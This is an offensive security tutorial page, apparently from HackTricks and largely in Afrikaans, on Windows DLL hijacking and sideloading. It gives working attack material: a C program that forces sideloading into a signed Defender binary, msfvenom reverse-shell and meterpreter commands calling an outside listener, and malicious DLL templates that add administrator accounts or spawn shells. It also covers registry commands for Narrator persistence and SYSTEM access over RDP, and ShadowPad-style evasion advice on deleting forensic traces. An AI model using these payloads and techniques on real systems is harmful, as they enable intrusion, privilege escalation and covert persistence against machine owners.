# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulasie van 'n betroubare toepassing om 'n kwaadwillige DLL te laai. Hierdie term omsluit verskeie taktieke soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, om persistence te bereik, en, minder algemeen, privilege escalation. Alhoewel die fokus hier op privilege escalation is, bly die metode van hijacking konstant oor verskillende doelwitte.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, elkeen met sy effektiwiteit afhangend van die toepassing se DLL-laaistrategie:

1. **DLL Replacement**: Vervang 'n egte DLL met 'n kwaadwillige een, opsioneel deur DLL Proxying te gebruik om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n soekpad wat voor die regmatige een kom, wat die toepassing se soekpatroon misbruik.
3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL wat 'n toepassing gaan laai omdat dit dink dit is 'n vereiste DLL wat nie bestaan nie.
4. **DLL Redirection**: Verander soekparameters soos %PATH% of .exe.manifest / .exe.local lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Vervang die regmatige DLL met 'n kwaadwillige eksemplaar in die WinSxS gids, 'n metode dikwels geassosieer met DLL side-loading.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n gebruiker-beheerde gids saam met die gekopieerde toepassing, wat ooreenstem met Binary Proxy Execution tegnieke.

> [!TIP]
> Vir 'n stapsgewyse ketting wat HTML staging, AES-CTR configs, en .NET implants bo-op DLL sideloading laer, sien die werkvloei hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Om ontbrekende Dlls te vind

Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop en die **volgende 2 filters** te **stel**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

en net die **File System Activity** te wys:

![](<../../../images/image (153).png>)

As jy op soek is na **missing dlls in general** laat jy dit hierdie proses vir 'n paar **sekondes** loop.\
As jy op soek is na 'n **missing dll inside an specific executable** moet jy 'n **ander filter soos "Process Name" "contains" `<exec name>`** stel, dit uitvoer, en dan die vaslegging stop om gebeure te analiseer.

## Exploiting Missing Dlls

Om privileges te escalate is die beste kans om 'n **dll te skryf wat 'n privilege process sal probeer laai** in een van die plekke waar dit gaan gesoek word. Dus sal ons in staat wees om 'n **dll te skryf** in 'n **gids** waar die **dll gesoek word voor** die gids waar die **oorspronklike dll** is (vreemde geval), of ons sal in staat wees om op 'n gids te skryf waar die dll gesoek gaan word en die oorspronklike **dll nie op enige gids bestaan nie**.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows-toepassings soek vir DLLs deur 'n stel voorafgedefinieerde soekpade te volg, in 'n bepaalde volgorde. Die probleem van DLL hijacking ontstaan wanneer 'n kwaadwillige DLL strategies in een van hierdie gidse geplaas word, sodat dit voor die egte DLL gelaai word. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paths gebruik wanneer dit na die DLLs verwys wat dit benodig.

Jy kan die **DLL search order op 32-bit** stelsels hieronder sien:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **standaard** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, verplaas die huidige gids na tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (standaard is geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Laastens, let daarop dat **'n dll gelaai kan word deur die absolute pad aan te dui in plaas van slegs die naam**. In daardie geval gaan daardie dll **slegs in daardie pad** gesoek word (as die dll enige afhanklikhede het, gaan hulle gesoek word soos normaalweg gelaai deur naam).

Daar is ander maniere om die soekorde te verander maar ek gaan hulle nie hier verduidelik nie.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

'n Gevorderde manier om die DLL-soekpad van 'n nuut geskepte proses deterministies te beïnvloed is om die DllPath veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses geskep word met ntdll se native APIs. Deur 'n aanvaller-beheerde gids hier te verskaf, kan 'n teikenproses wat 'n geïmporteerde DLL per naam oplos (geen absolute pad en nie die safe loading flags gebruik nie) gedwing word om 'n kwaadwillige DLL uit daardie gids te laai.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Volledige C-voorbeeld: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Plaas 'n kwaadwillige xmllite.dll (exporting the required functions or proxying to the real one) in jou DllPath-gids.
- Start 'n ondertekende binaire wat bekend is daarvoor om xmllite.dll per naam te soek met bogenoemde tegniek. Die loader los die import op via die verskafte DllPath en sideloads jou DLL.

Hierdie tegniek is in die natuur waargeneem om multi-stage sideloading chains aan te dryf: 'n aanvanklike launcher laat 'n helper DLL val, wat dan 'n Microsoft-signed, hijackable binary spawn met 'n aangepaste DllPath om die laaiing van die aanvaller se DLL vanaf 'n staging directory af te dwing.


#### Uitsonderings op DLL-soekorde volgens Windows-dokumentasie

Sekere uitsonderings op die standaard DLL-soekorde word in Windows-dokumentasie aangeteken:

- Wanneer 'n **DLL wat dieselfde naam deel as een wat reeds in geheue gelaai is** teengekom word, omseil die stelsel die normale soektog. In plaas daarvan voer dit 'n kontrole vir redirection en 'n manifest uit voordat dit op die DLL wat reeds in geheue is terugval. **In hierdie scenario voer die stelsel nie 'n soektog vir die DLL uit nie**.
- In gevalle waar die DLL as 'n **known DLL** vir die huidige Windows-weergawe herken word, sal die stelsel sy weergawe van die bekende DLL gebruik, tesame met enige van sy afhanklike DLL's, **sonder die soekproses**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat 'n lys van hierdie bekende DLLs.
- As 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL deur 'n volle pad geïdentifiseer is.

### Privilegie-eskalering

**Vereistes**:

- Identifiseer 'n proses wat onder **verskillende privilegieë** sal of werk (horizontal or lateral movement), wat **nie 'n DLL het nie**.
- Verseker dat **skryf toegang** beskikbaar is vir enige **gids** waarin die **DLL** gaan **gesoek word**. Hierdie ligging kan die gids van die uitvoerbare lêer wees of 'n gids binne die stelselpad.

Ja, die vereistes is moeilik om te vind aangesien dit **by default nogal vreemd is om 'n geprivilegieerde uitvoerbare lêer te vind wat 'n DLL mis** en dit is selfs **vreemder om skryfregte op 'n stelselpad-lêergids te hê** (jy kan dit nie standaard hê nie). Maar in wanopgestelde omgewings is dit moontlik.\
In die geval dat jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs al is die **main goal of the project is bypass UAC**, mag jy daar 'n **PoC** van 'n Dll hijaking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waarin jy skryfregte het te verander).

Let wel dat jy jou **toegangsregte in 'n gids kan nagaan** deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer toestemmings van alle vouers binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **abuse Dll Hijacking to escalate privileges** met toestemmings om te skryf in 'n **System Path folder** kyk:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outomatiese gereedskap

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal nagaan of jy skryfpermissies het op enige gids binne system PATH.\
Ander interessante outomatiese gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

As jy 'n uitbuitbare scenario vind, een van die belangrikste dinge om dit suksesvol te misbruik is om **'n dll te skep wat minstens al die funksies eksporteer wat die uitvoerbare program daarvandaan sal invoer**. Let wel, Dll Hijacking is handig om [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **how to create a valid dll** binne hierdie dll hijacking-studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder, in die **volgende afdeling** kan jy 'n paar **basiese dll-kodes** vind wat nuttig kan wees as **sjablone** of om 'n **dll te skep wat nie-verpligte funksies eksporteer**.

## **Skep en kompileer Dlls**

### **Dll Proksifisering**

Basies is 'n **Dll proxy** 'n Dll wat jou kwaadwillige kode kan **uitvoer wanneer dit gelaai word**, maar ook kan **blootstel** en **werk** soos **verwag** deur **al die oproepe na die werklike biblioteek te herlei**.

Met die hulpmiddel [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n executable aandui en die biblioteek kies** wat jy wil proxify en **'n proxified dll genereer** of **die Dll aandui** en **'n proxified dll genereer**.

### **Meterpreter**

**Kry rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let wel dat in verskeie gevalle die Dll wat jy kompileer moet **verskeie funksies exporteer** wat deur die victim process gelaai gaan word. As hierdie funksies nie bestaan nie, sal die **binary dit nie kan laai nie** en sal die **exploit misluk**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-voorbeeld met gebruikersaanmaak</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Toeganklikheid/ATs)

Windows Narrator.exe ondersoek steeds 'n voorspelbare, taalspesifieke lokalisasie DLL by opstart wat ge-hijack kan word vir arbitrary code execution and persistence.

Belangrike feite
- Bespeurde pad (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy pad (ouer builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As 'n skryfbare, deur 'n aanvaller beheerde DLL by die OneCore-pad bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` uitgevoer. Geen exports word benodig nie.

Ontdekking met Procmon
- Filter: `Process Name is Narrator.exe` en `Operation is Load Image` of `CreateFile`.
- Start Narrator en let op die poging om bogenoemde pad te laai.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC stilte
- 'n naïewe hijack sal die UI laat praat/uitlig. Om stil te bly, wanneer jy koppel, enumereer Narrator-drade, open die hoofdraad (`OpenThread(THREAD_SUSPEND_RESUME)`) en `SuspendThread` dit; gaan voort in jou eie draad. Sien PoC vir volle kode.

Trigger en persistentheid via Accessibility-konfigurasie
- Gebruikerskonteks (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde sal die begin van Narrator die geplante DLL laai. Op die secure desktop (aanmeldskerm), druk CTRL+WIN+ENTER om Narrator te begin.

RDP-geaktiveerde SYSTEM-uitvoering (laterale beweging)
- Skakel klassieke RDP-sekuriteitslaag toe: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die gasheer; by die aanmeldskerm druk CTRL+WIN+ENTER om Narrator te begin; jou DLL word as SYSTEM op die secure desktop uitgevoer.
- Die uitvoering stop wanneer die RDP-sessie sluit — injekteer/migreer vinnig.

Bring Your Own Accessibility (BYOA)
- Jy kan 'n ingeboude Accessibility Tool (AT) registerinskrywing kloon (bv. CursorIndicator), dit wysig om na 'n ewekansige binary/DLL te wys, dit invoer, en dan `configuration` op daardie AT-naam stel. Dit bied 'n proxy vir ewekansige uitvoering onder die Accessibility-framework.

Aantekeninge
- Skryf onder `%windir%\System32` en die verandering van HKLM-waardes vereis administrateurregte.
- Alle payload-logika kan in `DLL_PROCESS_ATTACH` leef; geen exports is nodig nie.

## Gevalstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), gedokumenteer as **CVE-2025-1729**.

### Kwesbaarheidsbesonderhede

- **Komponent**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geskeduleerde taak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` loop daagliks om 9:30 AM onder die konteks van die aangemelde gebruiker.
- **Gidspermissies**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers toelaat om ewekansige lêers te plaas.
- **DLL-soekgedrag**: Probeer eers om `hostfxr.dll` uit sy werkgids te laai en log "NAME NOT FOUND" indien dit ontbreek, wat aandui dat die plaaslike gids voorkeur geniet.

### Exploit-implementering

'n Aanvaller kan 'n kwaadwillige `hostfxr.dll`-stub in dieselfde gids plaas, wat die ontbrekende DLL misbruik om kode-uitvoering onder die gebruiker se konteks te verkry:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalsverloop

1. As 'n standaardgebruiker, plaas `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag dat die geskeduleerde taak om 9:30 AM onder die huidige gebruiker se konteks uitgevoer word.
3. As 'n administrateur aangemeld is wanneer die taak uitgevoer word, sal die kwaadwillige DLL in die administrateur se sessie op medium integrity loop.
4. Koppel standaard UAC bypass-tegnieke om vanaf medium integrity tot SYSTEM privileges te eskaleer.

## Gevalstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Aanvallers kombineer dikwels MSI-based droppers met DLL side-loading om payloads uit te voer onder 'n vertroude, signed process.

Chain overview
- Gebruiker laai MSI af. 'n CustomAction voer stilweg uit tydens die GUI-installasie (bv. LaunchApplication of 'n VBScript-aksie), en bou die volgende fase op uit ingebedde hulpbronne.
- Die dropper skryf 'n wettige, signed EXE en 'n kwaadwillige DLL na dieselfde gids (voorbeeldpaar: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wanneer die signed EXE gestarteer word, laai die Windows DLL search order eers wsc.dll vanaf die working directory, wat aanvallerkode onder 'n signed parent uitvoer (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction-tabel:
- Soek na inskrywings wat uitvoerbare lêers of VBScript uitvoer. Voorbeeld van 'n verdagte patroon: LaunchApplication wat 'n ingebedde lêer in die agtergrond uitvoer.
- In Orca (Microsoft Orca.exe), ondersoek CustomAction, InstallExecuteSequence en Binary-tabelle.
- Ingebedde/gespliste payloads in die MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Soek na meerdere klein fragmente wat gekonkateneer en gedekripteer word deur 'n VBScript CustomAction. Algemene vloei:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde gids:
- wsc_proxy.exe: legitieme gesigneerde host (Avast). Die proses probeer wsc.dll per naam uit sy gids laai.
- wsc.dll: attacker DLL. As geen spesifieke exports vereis word nie, kan DllMain volstaan; anders bou 'n proxy DLL en stuur die vereiste exports na die egte biblioteek terwyl die payload in DllMain uitgevoer word.
- Bou 'n minimale DLL-payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir exportvereistes, gebruik 'n proxying framework (bv., DLLirant/Spartacus) om 'n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek berus op DLL name resolution deur die host-binary. As die host absolute paths of safe loading flags gebruik (bv., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan die hijack misluk.
- KnownDLLs, SxS, en forwarded exports kan precedensie beïnvloed en moet oorweeg word tydens die keuse van die host binary en export set.

## Ondertekende triades + encrypted payloads (ShadowPad case study)

Check Point het beskryf hoe Ink Dragon ShadowPad ontplooi deur 'n **drie-lêer triade** te gebruik om tussen regmatige sagteware in te meng terwyl die kern payload op skyf geënkripteer bly:

1. **Ondertekende host EXE** – verskaffers soos AMD, Realtek, of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die aanvallers hernoem die uitvoerbare lêer om soos 'n Windows-binary te lyk (bv. `conhost.exe`), maar die Authenticode-handtekening bly geldig.
2. **Kwaadaardige loader DLL** – neergesit langs die EXE met 'n verwagte naam (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik 'n MFC binary wat met die ScatterBrain framework obfuskeer is; sy enigste taak is om die geënkripteerde blob te vind, dit te dekripteer, en ShadowPad reflectively te map.
3. **Geënkripteerde payload blob** – dikwels gestoor as `<name>.tmp` in dieselfde gids. Na memory-mapping van die gedekripteerde payload, verwyder die loader die TMP-lêer om forensiese bewyse te vernietig.

Handelstegniek notas:

* Deur die ondertekende EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE header behou word) kan dit as 'n Windows-binary voortsdoen maar steeds die verskaffer-handtekening behou; repliseer dus Ink Dragon se gewoonte om `conhost.exe`-agtige binaries neer te sit wat eintlik AMD/NVIDIA-hulpmiddels is.
* Aangesien die uitvoerbare lêer vertrou bly, benodig meeste allowlisting-beheer slegs dat jou kwaadwillige DLL langsaan sit. Fokus op die aanpassing van die loader DLL; die ondertekende ouer kan tipies onaangeraak loop.
* ShadowPad se decryptor verwag dat die TMP-blob langs die loader woon en skryfbaar is sodat dit die lêer kan zero maak nadat dit gemap is. Hou die gids skryfbaar totdat die payload laai; sodra dit in geheue is kan die TMP-lêer veilig uitgevee word vir OPSEC.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
